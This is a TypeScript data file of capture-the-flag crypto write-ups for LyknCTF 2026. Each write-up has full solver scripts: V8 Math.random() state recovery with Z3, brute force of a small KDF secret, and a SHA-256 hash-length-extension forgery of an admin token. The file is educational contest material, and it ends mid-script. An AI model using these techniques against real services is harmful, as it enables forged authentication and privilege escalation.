import type { WriteUp } from "../types";

export const lyknctf2026Writeups: WriteUp[] = [
  {
    "id": "lyknctf2026-crypto-67xbet",
    "title": "67xbet",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Crypto  \n**CTF:** LYKN CTF 2026  \n**Flag:** `LYKNCTF{df2486288f1c41819341feb0d3bf7fa4}`",
    "problemDescription": "**Category:** Crypto  \n**CTF:** LYKN CTF 2026  \n**Flag:** `LYKNCTF{df2486288f1c41819341feb0d3bf7fa4}`",
    "tools": [],
    "analysis": "### Identifikasi PRNG\n\nAngka yang keluar cocok dengan implementasi `Math.random()` milik V8. Generator internalnya memakai state 128-bit dan transisi xorshift128+:\n\n```python\ndef xs128p(state0, state1):\n    x = state0\n    y = state1\n\n    next_state0 = y\n    x ^= x << 23\n    x ^= x >> 17\n    x ^= y\n    x ^= y >> 26\n    next_state1 = x\n\n    return next_state0, next_state1\n```\n\nV8 mengubah 52 bit atas state menjadi float:\n\n```text\noutput = (state >> 12) / 2^52\n```\n\nSatu output membocorkan 52 bit state. Lima output memberi 260 bit constraint, lebih dari cukup untuk menentukan state 128-bit yang relevan.\n\n### Cache V8 yang Terbalik\n\nV8 tidak langsung mengembalikan output setiap kali generator dipanggil. Runtime mengisi cache angka secara maju, lalu mengeluarkan isi cache dari indeks belakang ke depan.\n\nAkibatnya, lima angka yang terlihat harus diproses dalam urutan terbalik saat membangun constraint:\n\n```python\nfor value in reversed(numbers):\n    solver.add(Extract(63, 12, state1) == mantissa(value))\n    state0, state1 = xs128p(state0, state1)\n```\n\nSetelah state awal ditemukan, 52 bit atas `initial_state0` adalah angka berikutnya yang akan keluar dari cache.\n\nUntuk instance yang dipakai:\n\n```text\nvisible:\n0.2553032794822707\n0.1104514716087448\n0.24925486874785618\n0.8602180479766215\n0.1532126389221664\n\npredicted:\n0.8729714324958713\n```",
    "solution": [
      {
        "title": "Description",
        "content": "> Messi vs Ronaldo\n\nWeb app menampilkan lima angka acak dan menyembunyikan angka keenam. Server hanya memberikan flag kalau angka keenam bisa diprediksi dengan tepat."
      },
      {
        "title": "Recon",
        "content": "Endpoint utama:\n\n\n\n`/api/random` mengembalikan lima angka serta hash integritas:\n\n\n\nPayload validasi berbentuk:\n\n\n\nHash tidak perlu dipalsukan. Solver tetap mengirim angka dan hash asli, lalu hanya mengganti `answer`.",
        "code": "GET  /api/random\nPOST /api/validate"
      },
      {
        "title": "Solver",
        "content": "",
        "code": "#!/usr/bin/env python3\nimport json\nimport sys\nimport urllib.request\nfrom typing import Any\n\nfrom z3 import BitVec, Extract, LShR, Solver, sat\n\n\nDEFAULT_BASE_URL = \"http://6676e891-94f4-4542-86ba-67cde13e84c3.51.79.140.18.nip.io:8080\"\nMASK_52 = (1 << 52) - 1\n\n\ndef get_json(url: str) -> dict[str, Any]:\n    with urllib.request.urlopen(url, timeout=10) as response:\n        return json.loads(response.read().decode())\n\n\ndef post_json(url: str, payload: dict[str, Any]) -> dict[str, Any]:\n    body = json.dumps(payload, separators=(\",\", \":\")).encode()\n    request = urllib.request.Request(\n        url,\n        data=body,\n        headers={\"Content-Type\": \"application/json\"},\n        method=\"POST\",\n    )\n\n    with urllib.request.urlopen(request, timeout=10) as response:\n        return json.loads(response.read().decode())\n\n\ndef xs128p(state0, state1):\n    x = state0\n    y = state1\n\n    next_state0 = y\n    x ^= x << 23\n    x ^= LShR(x, 17)\n    x ^= y\n    x ^= LShR(y, 26)\n    next_state1 = x\n\n    return next_state0, next_state1\n\n\ndef float_to_mantissa(value: float) -> int:\n    # Math.random() menghasilkan kelipatan tepat dari 2^-52.\n    return int(value * (1 << 52)) & MASK_52\n\n\ndef mantissa_to_float(value: int) -> float:\n    return value / float(1 << 52)\n\n\ndef predict_sixth(numbers: list[float]) -> float:\n    if len(numbers) != 5:\n        raise ValueError(\"Expected exactly five visible outputs\")\n\n    initial_state0 = BitVec(\"initial_state0\", 64)\n    initial_state1 = BitVec(\"initial_state1\", 64)\n\n    state0 = initial_state0\n    state1 = initial_state1\n    solver = Solver()\n\n    # V8 mengisi cache secara maju, tetapi Math.random() mengeluarkannya\n    # dari belakang. Karena itu urutan yang terlihat harus dibalik.\n    for value in reversed(numbers):\n        solver.add(Extract(63, 12, state1) == float_to_mantissa(value))\n        state0, state1 = xs128p(state0, state1)\n\n    if solver.check() != sat:\n        raise RuntimeError(\"Failed to recover a compatible V8 PRNG state\")\n\n    model = solver.model()\n    predicted_mantissa = model.eval(\n        Extract(63, 12, initial_state0)\n    ).as_long()\n\n    # Pastikan prediksi upper 52-bit unik, bukan cuma salah satu model.\n    solver.add(Extract(63, 12, initial_state0) != predicted_mantissa)\n    if solver.check() == sat:\n        raise RuntimeError(\"Prediction is ambiguous\")\n\n    return mantissa_to_float(predicted_mantissa)\n\n\ndef main() -> None:\n    base_url = sys.argv[1].rstrip(\"/\") if len(sys.argv) > 1 else DEFAULT_BASE_URL\n\n    instance = get_json(f\"{base_url}/api/random\")\n    numbers = instance[\"numbers\"]\n    digest = instance[\"hash\"]\n\n    prediction = predict_sixth(numbers)\n\n    print(\"[*] First five outputs:\")\n    for index, number in enumerate(numbers, 1):\n        print(f\"    {index}: {number!r}\")\n\n    print(f\"[+] Predicted sixth: {prediction!r}\")\n\n    result = post_json(\n        f\"{base_url}/api/validate\",\n        {\n            \"numbers\": numbers,\n            \"answer\": prediction,\n            \"hash\": digest,\n        },\n    )\n\n    if \"flag\" not in result:\n        raise RuntimeError(result.get(\"error\", \"Validation failed\"))\n\n    print(f\"[+] Flag: {result['flag']}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "title": "Eksekusi",
        "content": "Install dependency:",
        "code": "source /home/nata/ctf_env/bin/activate\npip install z3-solver"
      },
      {
        "title": "Jalankan:",
        "content": "Solver mengambil instance baru, memulihkan state, memprediksi angka keenam, lalu langsung mengirim jawaban ke `/api/validate`.\n\nOutput instance solve:",
        "code": "python3 solve.py"
      },
      {
        "title": "Kesimpulan",
        "content": "Masalahnya bukan menebak angka acak, tetapi memulihkan state PRNG yang deterministik. Lima output `Math.random()` membocorkan cukup banyak bit untuk menyelesaikan state xorshift128+ dengan Z3. Detail cache V8 yang dibaca secara terbalik menjadi bagian penting; tanpa membalik urutan output, constraint tidak konsisten."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport json\r\nimport sys\r\nimport urllib.request\r\nfrom typing import Any\r\n\r\nfrom z3 import BitVec, Extract, LShR, Solver, sat\r\n\r\n\r\nDEFAULT_BASE_URL = \"http://6676e891-94f4-4542-86ba-67cde13e84c3.51.79.140.18.nip.io:8080\"\r\nMASK_52 = (1 << 52) - 1\r\n\r\n\r\ndef get_json(url: str) -> dict[str, Any]:\r\n    with urllib.request.urlopen(url, timeout=10) as response:\r\n        return json.loads(response.read().decode())\r\n\r\n\r\ndef post_json(url: str, payload: dict[str, Any]) -> dict[str, Any]:\r\n    body = json.dumps(payload, separators=(\",\", \":\")).encode()\r\n    request = urllib.request.Request(\r\n        url,\r\n        data=body,\r\n        headers={\"Content-Type\": \"application/json\"},\r\n        method=\"POST\",\r\n    )\r\n\r\n    with urllib.request.urlopen(request, timeout=10) as response:\r\n        return json.loads(response.read().decode())\r\n\r\n\r\ndef xs128p(state0, state1):\r\n    x = state0\r\n    y = state1\r\n\r\n    next_state0 = y\r\n    x ^= x << 23\r\n    x ^= LShR(x, 17)\r\n    x ^= y\r\n    x ^= LShR(y, 26)\r\n    next_state1 = x\r\n\r\n    return next_state0, next_state1\r\n\r\n\r\ndef float_to_mantissa(value: float) -> int:\r\n    # Math.random() menghasilkan kelipatan tepat dari 2^-52.\r\n    return int(value * (1 << 52)) & MASK_52\r\n\r\n\r\ndef mantissa_to_float(value: int) -> float:\r\n    return value / float(1 << 52)\r\n\r\n\r\ndef predict_sixth(numbers: list[float]) -> float:\r\n    if len(numbers) != 5:\r\n        raise ValueError(\"Expected exactly five visible outputs\")\r\n\r\n    initial_state0 = BitVec(\"initial_state0\", 64)\r\n    initial_state1 = BitVec(\"initial_state1\", 64)\r\n\r\n    state0 = initial_state0\r\n    state1 = initial_state1\r\n    solver = Solver()\r\n\r\n    # V8 mengisi cache secara maju, tetapi Math.random() mengeluarkannya\r\n    # dari belakang. Karena itu urutan yang terlihat harus dibalik.\r\n    for value in reversed(numbers):\r\n        solver.add(Extract(63, 12, state1) == float_to_mantissa(value))\r\n        state0, state1 = xs128p(state0, state1)\r\n\r\n    if solver.check() != sat:\r\n        raise RuntimeError(\"Failed to recover a compatible V8 PRNG state\")\r\n\r\n    model = solver.model()\r\n    predicted_mantissa = model.eval(\r\n        Extract(63, 12, initial_state0)\r\n    ).as_long()\r\n\r\n    # Pastikan prediksi upper 52-bit unik, bukan cuma salah satu model.\r\n    solver.add(Extract(63, 12, initial_state0) != predicted_mantissa)\r\n    if solver.check() == sat:\r\n        raise RuntimeError(\"Prediction is ambiguous\")\r\n\r\n    return mantissa_to_float(predicted_mantissa)\r\n\r\n\r\ndef main() -> None:\r\n    base_url = sys.argv[1].rstrip(\"/\") if len(sys.argv) > 1 else DEFAULT_BASE_URL\r\n\r\n    instance = get_json(f\"{base_url}/api/random\")\r\n    numbers = instance[\"numbers\"]\r\n    digest = instance[\"hash\"]\r\n\r\n    prediction = predict_sixth(numbers)\r\n\r\n    print(\"[*] First five outputs:\")\r\n    for index, number in enumerate(numbers, 1):\r\n        print(f\"    {index}: {number!r}\")\r\n\r\n    print(f\"[+] Predicted sixth: {prediction!r}\")\r\n\r\n    result = post_json(\r\n        f\"{base_url}/api/validate\",\r\n        {\r\n            \"numbers\": numbers,\r\n            \"answer\": prediction,\r\n            \"hash\": digest,\r\n        },\r\n    )\r\n\r\n    if \"flag\" not in result:\r\n        raise RuntimeError(result.get(\"error\", \"Validation failed\"))\r\n\r\n    print(f\"[+] Flag: {result['flag']}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{df2486288f1c41819341feb0d3bf7fa4}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-cyclicecho",
    "title": "Cyclic Echo",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Crypto  \n**CTF:** LYKN CTF 2026  \n**Flag:** `LYKNCTF{63da0d1a9d434cc49844f44546da982c}`",
    "problemDescription": "**Category:** Crypto  \n**CTF:** LYKN CTF 2026  \n**Flag:** `LYKNCTF{63da0d1a9d434cc49844f44546da982c}`",
    "tools": [],
    "analysis": "Key AES dibentuk dari:\n\n```python\ns_alg = sum((i + 1) * f[i] * g[i] for i in range(N)) % Q_PRIME\n```\n\nParameter yang dipakai:\n\n```python\nQ_PRIME = 4099\n```\n\nLalu `s_alg` masuk ke HKDF bersama nilai publik `N` dan `Q`:\n\n```python\nikm = (\n    s_alg.to_bytes(2, \"big\")\n    + N.to_bytes(2, \"big\")\n    + Q.to_bytes(2, \"big\")\n)\n\nkey = HKDF(\n    master=ikm,\n    key_len=32,\n    salt=salt,\n    hashmod=SHA256,\n    context=b\"lyknctf-2026\",\n)\n```\n\nKarena `s_alg` direduksi modulo `4099`, ruang rahasianya hanya:\n\n```text\n0 <= s_alg < 4099\n```\n\nJadi cukup brute-force 4099 kandidat. Public key NTRU dan side-channel leak tidak dibutuhkan.\n\nSetiap kandidat dipakai untuk menurunkan key AES. Tag GCM menjadi oracle validasi:\n\n```python\ncipher.decrypt_and_verify(ciphertext, tag)\n```\n\nKey salah selalu gagal verifikasi. Key benar langsung membuka flag.",
    "solution": [
      {
        "title": "Description",
        "content": "> A signal keeps repeating, echoing back on itself in a loop no one can quite explain. Listen closely enough, and the echo gives away where it came from.\n\nService mengirim public key NTRU, leak sederhana dari private polynomial, lalu flag yang dienkripsi memakai AES-GCM.\n\nSekilas jalurnya terlihat seperti recovery private key NTRU. Ternyata nggak perlu."
      },
      {
        "title": "Solver",
        "content": "",
        "code": "#!/usr/bin/env python3\nimport json\nimport socket\nimport sys\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256\nfrom Crypto.Protocol.KDF import HKDF\n\n\nDEFAULT_HOST = \"51.79.140.18\"\nDEFAULT_PORT = 19705\nKDF_INFO = b\"lyknctf-2026\"\n\n\ndef recv_instance(host: str, port: int) -> dict:\n    data = b\"\"\n\n    with socket.create_connection((host, port), timeout=10) as sock:\n        sock.settimeout(3)\n\n        while True:\n            try:\n                chunk = sock.recv(65536)\n            except socket.timeout:\n                break\n\n            if not chunk:\n                break\n\n            data += chunk\n\n            start = data.find(b\"{\")\n            end = data.rfind(b\"}\")\n\n            if start != -1 and end > start:\n                try:\n                    return json.loads(data[start:end + 1])\n                except json.JSONDecodeError:\n                    pass\n\n    start = data.find(b\"{\")\n    end = data.rfind(b\"}\")\n\n    if start == -1 or end <= start:\n        raise RuntimeError(\"Remote tidak mengirim JSON valid\")\n\n    return json.loads(data[start:end + 1])\n\n\ndef derive_key(s_alg: int, n: int, q: int, salt: bytes) -> bytes:\n    ikm = (\n        s_alg.to_bytes(2, \"big\")\n        + n.to_bytes(2, \"big\")\n        + q.to_bytes(2, \"big\")\n    )\n\n    return HKDF(\n        master=ikm,\n        key_len=32,\n        salt=salt,\n        hashmod=SHA256,\n        context=KDF_INFO,\n    )\n\n\ndef solve(instance: dict) -> tuple[int, bytes]:\n    params = instance[\"parameters\"]\n    encrypted = instance[\"encrypted_flag\"]\n\n    n = int(params[\"N\"])\n    q = int(params[\"q\"])\n    q_prime = int(params[\"q_prime\"])\n\n    salt = bytes.fromhex(encrypted[\"salt\"])\n    nonce = bytes.fromhex(encrypted[\"nonce\"])\n    ciphertext = bytes.fromhex(encrypted[\"ciphertext\"])\n    tag = bytes.fromhex(encrypted[\"tag\"])\n\n    for s_alg in range(q_prime):\n        key = derive_key(s_alg, n, q, salt)\n        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n\n        try:\n            plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n        except ValueError:\n            continue\n\n        return s_alg, plaintext\n\n    raise RuntimeError(\"Tidak ada kandidat valid\")\n\n\ndef main():\n    host = sys.argv[1] if len(sys.argv) >= 2 else DEFAULT_HOST\n    port = int(sys.argv[2]) if len(sys.argv) >= 3 else DEFAULT_PORT\n\n    instance = recv_instance(host, port)\n    s_alg, plaintext = solve(instance)\n\n    print(f\"[+] s_alg = {s_alg}\")\n    print(f\"[+] flag  = {plaintext.decode()}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "title": "Eksekusi",
        "content": "Output remote:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py 51.79.140.18 19705"
      },
      {
        "title": "Kesimpulan",
        "content": "Lapisan NTRU cuma distraksi. Seluruh secret untuk KDF dipadatkan menjadi satu integer modulo 4099, sehingga effective key space jatuh ke 4099 kemungkinan.\n\nAES-GCM membuat brute-force makin gampang karena tag autentikasinya langsung membedakan key benar dan salah."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport json\r\nimport socket\r\nimport sys\r\n\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Hash import SHA256\r\nfrom Crypto.Protocol.KDF import HKDF\r\n\r\n\r\nDEFAULT_HOST = \"51.79.140.18\"\r\nDEFAULT_PORT = 19705\r\nKDF_INFO = b\"lyknctf-2026\"\r\n\r\n\r\ndef recv_instance(host: str, port: int) -> dict:\r\n    data = b\"\"\r\n\r\n    with socket.create_connection((host, port), timeout=10) as sock:\r\n        sock.settimeout(3)\r\n\r\n        while True:\r\n            try:\r\n                chunk = sock.recv(65536)\r\n            except socket.timeout:\r\n                break\r\n\r\n            if not chunk:\r\n                break\r\n\r\n            data += chunk\r\n\r\n            # Coba parse segera kalau JSON sudah lengkap.\r\n            start = data.find(b\"{\")\r\n            end = data.rfind(b\"}\")\r\n\r\n            if start != -1 and end > start:\r\n                try:\r\n                    return json.loads(data[start:end + 1])\r\n                except json.JSONDecodeError:\r\n                    pass\r\n\r\n    start = data.find(b\"{\")\r\n    end = data.rfind(b\"}\")\r\n\r\n    if start == -1 or end <= start:\r\n        raise RuntimeError(f\"Remote tidak mengirim JSON valid:\\n{data!r}\")\r\n\r\n    return json.loads(data[start:end + 1])\r\n\r\n\r\ndef derive_key(s_alg: int, n: int, q: int, salt: bytes) -> bytes:\r\n    ikm = (\r\n        s_alg.to_bytes(2, \"big\")\r\n        + n.to_bytes(2, \"big\")\r\n        + q.to_bytes(2, \"big\")\r\n    )\r\n\r\n    return HKDF(\r\n        master=ikm,\r\n        key_len=32,\r\n        salt=salt,\r\n        hashmod=SHA256,\r\n        context=KDF_INFO,\r\n    )\r\n\r\n\r\ndef solve(instance: dict) -> tuple[int, bytes]:\r\n    params = instance[\"parameters\"]\r\n    encrypted = instance[\"encrypted_flag\"]\r\n\r\n    n = int(params[\"N\"])\r\n    q = int(params[\"q\"])\r\n    q_prime = int(params[\"q_prime\"])\r\n\r\n    salt = bytes.fromhex(encrypted[\"salt\"])\r\n    nonce = bytes.fromhex(encrypted[\"nonce\"])\r\n    ciphertext = bytes.fromhex(encrypted[\"ciphertext\"])\r\n    tag = bytes.fromhex(encrypted[\"tag\"])\r\n\r\n    print(f\"[*] Brute-forcing s_alg modulo {q_prime}...\")\r\n\r\n    for s_alg in range(q_prime):\r\n        key = derive_key(s_alg, n, q, salt)\r\n\r\n        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\r\n\r\n        try:\r\n            plaintext = cipher.decrypt_and_verify(ciphertext, tag)\r\n        except ValueError:\r\n            continue\r\n\r\n        return s_alg, plaintext\r\n\r\n    raise RuntimeError(\"Tidak ada kandidat s_alg yang valid\")\r\n\r\n\r\ndef main():\r\n    host = sys.argv[1] if len(sys.argv) >= 2 else DEFAULT_HOST\r\n    port = int(sys.argv[2]) if len(sys.argv) >= 3 else DEFAULT_PORT\r\n\r\n    print(f\"[*] Connecting to {host}:{port}\")\r\n    instance = recv_instance(host, port)\r\n\r\n    s_alg, plaintext = solve(instance)\r\n\r\n    print(f\"[+] s_alg = {s_alg}\")\r\n    print(f\"[+] flag  = {plaintext.decode()}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{63da0d1a9d434cc49844f44546da982c}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-hashdash",
    "title": "LYKNCTF 2026: Hash & Dash",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "LYKNCTF 2026 Writeup: Hash & Dash",
    "problemDescription": "In this challenge, we are provided with a netcat service (nc 51.79.140.18 17896) that acts as a tiny access-token service. Upon connecting, the server gives us a JSON object containing a message, its hex representation, and a valid guest token:\n\n{\"message\": \"user=guest&role=viewer\", \"message_hex\": \"757365723d677565737426726f6c653d766965776572\", \"token\": \"1fb8b6844df355ffbfcaaf436b2a35e78ced80adbe054ae943bf903533851e93\"}\n\n\nThe goal is to submit a valid token for a modified message that grants \"admin access\".",
    "tools": [],
    "analysis": "The token provided is exactly 64 characters long in hexadecimal, which corresponds to 256 bits. This strongly indicates the use of the SHA-256 hashing algorithm.\n\nThe service appears to be generating tokens using a vulnerable MAC (Message Authentication Code) construction:\nMAC = SHA-256(secret_key || message)\n\nBecause SHA-256 is based on the Merkle-Damgård construction, it processes messages in blocks and maintains an internal state. If an attacker knows the length of the secret_key and the final hash (token) of the original message, they can use that hash as the starting state to append new data to the message and calculate a valid new hash—without ever knowing the actual secret key.\n\nThis vulnerability is known as a Hash Length Extension Attack (HLE).",
    "solution": [
      {
        "title": "The Dynamic Token Twist",
        "content": "Initially, one might try to compute the forged token offline and manually submit it. However, the server generates a new, dynamic token every time a connection is established. This means the exploit must be fully automated: the script must connect, read the active token, forge the payload, and submit it within a single session."
      },
      {
        "title": "Python 3.12 Compatibility Issues",
        "content": "Standard HLE tools and libraries like hashpumpy or hlextend often rely on legacy C-extensions that fail to compile or run on modern Python 3.12 environments (throwing SystemError: PY_SSIZE_T_CLEAN). To bypass this, we can implement the SHA-256 compression function and padding logic entirely in pure Python."
      },
      {
        "title": "The Application Logic Flaw",
        "content": "Once the cryptographic hurdle is bypassed, we need to determine the correct payload to escalate privileges. Appending &role=admin results in a valid token, but the server responds with:\n{\"ok\": true, \"admin\": false, \"error\": \"token valid but no admin grant\"}\n\nThis reveals a secondary logic puzzle: the server isn't looking for role=admin, but rather a specific boolean/flag parameter indicating admin status. By changing our appended data to &admin=true, the server grants access and returns the flag.\n\nDuring the exploit development, we also dynamically brute-forced the unknown length of the secret_key, which turned out to be exactly 16 bytes."
      },
      {
        "title": "Solution (Exploit Script)",
        "content": "Below is the final, pure-Python exploit script that connects to the server, parses the dynamic token, performs the Hash Length Extension attack on the fly (assuming a secret length of 16), and grabs the flag.",
        "code": "import struct\nimport json\nfrom pwn import *\n\nK = [\n    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,\n    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,\n    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,\n    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,\n    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,\n    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\n]\n\ndef rright(val, n):\n    return (val >> n) | ((val & ((1 << n) - 1)) << (32 - n))\n\ndef sha256_compress(state, chunk):\n    w = list(struct.unpack(\">16I\", chunk)) + [0] * 48\n    for i in range(16, 64):\n        s0 = rright(w[i - 15], 7) ^ rright(w[i - 15], 18) ^ (w[i - 15] >> 3)\n        s1 = rright(w[i - 2], 17) ^ rright(w[i - 2], 19) ^ (w[i - 2] >> 10)\n        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) & 0xFFFFFFFF\n\n    a, b, c, d, e, f, g, h = state\n    for i in range(64):\n        s1 = rright(e, 6) ^ rright(e, 11) ^ rright(e, 25)\n        ch = (e & f) ^ (~e & g)\n        temp1 = (h + s1 + ch + K[i] + w[i]) & 0xFFFFFFFF\n        s0 = rright(a, 2) ^ rright(a, 13) ^ rright(a, 22)\n        maj = (a & b) ^ (a & c) ^ (b & c)\n        temp2 = (s0 + maj) & 0xFFFFFFFF\n\n        h, g, f, e, d, c, b, a = g, f, e, (d + temp1) & 0xFFFFFFFF, c, b, a, (temp1 + temp2) & 0xFFFFFFFF\n\n    return [(x + y) & 0xFFFFFFFF for x, y in zip(state, [a, b, c, d, e, f, g, h])]\n\ndef sha256_padding(msg_len):\n    padding = b'\\x80'\n    padding += b'\\x00' * ((56 - (msg_len + 1) % 64) % 64)\n    padding += struct.pack(\">Q\", msg_len * 8)\n    return padding\n\ndef hle_sha256(original_token_hex, original_msg, append_data, secret_length):\n    state = [int(original_token_hex[i:i+8], 16) for i in range(0, 64, 8)]\n    total_orig_len = secret_length + len(original_msg)\n    pad = sha256_padding(total_orig_len)\n    new_msg = original_msg + pad + append_data\n    total_new_len = total_orig_len + len(pad) + len(append_data)\n    data_to_hash = append_data + sha256_padding(total_new_len)\n    \n    for i in range(0, len(data_to_hash), 64):\n        state = sha256_compress(state, data_to_hash[i:i+64])\n        \n    new_token = \"\".join(f\"{x:08x}\" for x in state)\n    return new_token, new_msg\n\ndef solve_hash_dash():\n    host = '51.79.140.18'\n    port = 17896\n    \n    append_data = b\"&admin=true\"\n    secret_length = 16 \n    \n    context.log_level = 'error'\n    print(\"[*] Sending HLE payload with admin=true...\")\n    \n    try:\n        r = remote(host, port)\n        \n        # Parse dynamic server data\n        raw_data = r.recvline().decode('utf-8').strip()\n        server_data = json.loads(raw_data)\n        \n        original_msg = server_data[\"message\"].encode()\n        original_token = server_data[\"token\"]\n        \n        # Calculate HLE\n        new_token, new_msg = hle_sha256(original_token, original_msg, append_data, secret_length)\n        \n        # Build JSON payload\n        payload = json.dumps({\n            \"msg\": new_msg.hex(),\n            \"tag\": new_token\n        }).encode()\n\n        # Send payload and retrieve response\n        r.recvuntil(b'> ')\n        r.sendline(payload)\n        \n        response = r.recvall(timeout=2).decode('utf-8', errors='ignore').strip()\n        r.close()\n        \n        print(f\"\\n[+] Server Response:\\n{response}\")\n            \n    except Exception as e:\n        print(f\"[-] Connection failed: {e}\")\n\nif __name__ == \"__main__\":\n    solve_hash_dash()"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import struct\r\nimport json\r\nfrom pwn import *\r\n\r\n# --- IMPLEMENTASI MURNI SHA-256 HLE ---\r\nK = [\r\n    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,\r\n    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,\r\n    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\r\n    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,\r\n    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,\r\n    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\r\n    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,\r\n    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\r\n]\r\n\r\ndef rright(val, n):\r\n    return (val >> n) | ((val & ((1 << n) - 1)) << (32 - n))\r\n\r\ndef sha256_compress(state, chunk):\r\n    w = list(struct.unpack(\">16I\", chunk)) + [0] * 48\r\n    for i in range(16, 64):\r\n        s0 = rright(w[i - 15], 7) ^ rright(w[i - 15], 18) ^ (w[i - 15] >> 3)\r\n        s1 = rright(w[i - 2], 17) ^ rright(w[i - 2], 19) ^ (w[i - 2] >> 10)\r\n        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) & 0xFFFFFFFF\r\n\r\n    a, b, c, d, e, f, g, h = state\r\n    for i in range(64):\r\n        s1 = rright(e, 6) ^ rright(e, 11) ^ rright(e, 25)\r\n        ch = (e & f) ^ (~e & g)\r\n        temp1 = (h + s1 + ch + K[i] + w[i]) & 0xFFFFFFFF\r\n        s0 = rright(a, 2) ^ rright(a, 13) ^ rright(a, 22)\r\n        maj = (a & b) ^ (a & c) ^ (b & c)\r\n        temp2 = (s0 + maj) & 0xFFFFFFFF\r\n\r\n        h, g, f, e, d, c, b, a = g, f, e, (d + temp1) & 0xFFFFFFFF, c, b, a, (temp1 + temp2) & 0xFFFFFFFF\r\n\r\n    return [(x + y) & 0xFFFFFFFF for x, y in zip(state, [a, b, c, d, e, f, g, h])]\r\n\r\ndef sha256_padding(msg_len):\r\n    padding = b'\\x80'\r\n    padding += b'\\x00' * ((56 - (msg_len + 1) % 64) % 64)\r\n    padding += struct.pack(\">Q\", msg_len * 8)\r\n    return padding\r\n\r\ndef hle_sha256(original_token_hex, original_msg, append_data, secret_length):\r\n    state = [int(original_token_hex[i:i+8], 16) for i in range(0, 64, 8)]\r\n    total_orig_len = secret_length + len(original_msg)\r\n    pad = sha256_padding(total_orig_len)\r\n    new_msg = original_msg + pad + append_data\r\n    total_new_len = total_orig_len + len(pad) + len(append_data)\r\n    data_to_hash = append_data + sha256_padding(total_new_len)\r\n    \r\n    for i in range(0, len(data_to_hash), 64):\r\n        state = sha256_compress(state, data_to_hash[i:i+64])\r\n        \r\n    new_token = \"\".join(f\"{x:08x}\" for x in state)\r\n    return new_token, new_msg\r\n\r\n# --- MAIN EXPLOIT ---\r\ndef solve_hash_dash():\r\n    host = '51.79.140.18'\r\n    port = 13963\r\n    \r\n    # Kita ubah tebakan payload-nya ke parameter \"admin\"\r\n    append_data = b\"&admin=true\" \r\n    secret_length = 16 # Langsung kunci di angka yang sudah pasti benar!\r\n    \r\n    context.log_level = 'error'\r\n\r\n    print(\"[*] Mengirim payload HLE dengan admin=true...\")\r\n    \r\n    try:\r\n        r = remote(host, port)\r\n        \r\n        # Baca token 